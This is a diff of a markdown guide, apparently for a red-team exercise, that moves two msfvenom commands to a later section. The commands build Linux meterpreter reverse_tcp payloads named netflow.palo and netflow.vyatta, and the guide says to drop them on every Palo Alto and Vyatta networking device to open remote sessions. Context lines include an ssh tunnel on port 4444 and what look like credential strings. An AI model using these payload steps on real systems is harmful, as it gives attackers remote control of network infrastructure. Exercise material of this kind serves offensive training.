@@ -52,19 +52,6 @@ ssh -p 4444 localhost   # tunnel to Djibouti
 ### Metasploit Payload Setup
 Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
 
-Make the Payload file for The Palo:
-On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called `netflow.palo` .
-
-``` bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > netflow.palo
-```
-
-Next, make the payload file for the vyatta routers:
-In the same directory on your Attack box, run the following command. The payload will be saved to a file called `netflow.vyatta` .
-
-```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
-```
 
 ### Exploit Setup
 
@@ -241,6 +228,20 @@ X2qY$6@Cv9w2
 KG+Vs7e5$dF4
 
 ```
+Make the Payload file for The Palo:
+On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called `netflow.palo` .
+
+``` bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > netflow.palo
+```
+
+Next, make the payload file for the vyatta routers:
+In the same directory on your Attack box, run the following command. The payload will be saved to a file called `netflow.vyatta` .
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
+```
+
 
 - Now that you are fully set up, move to Phase 1.
 
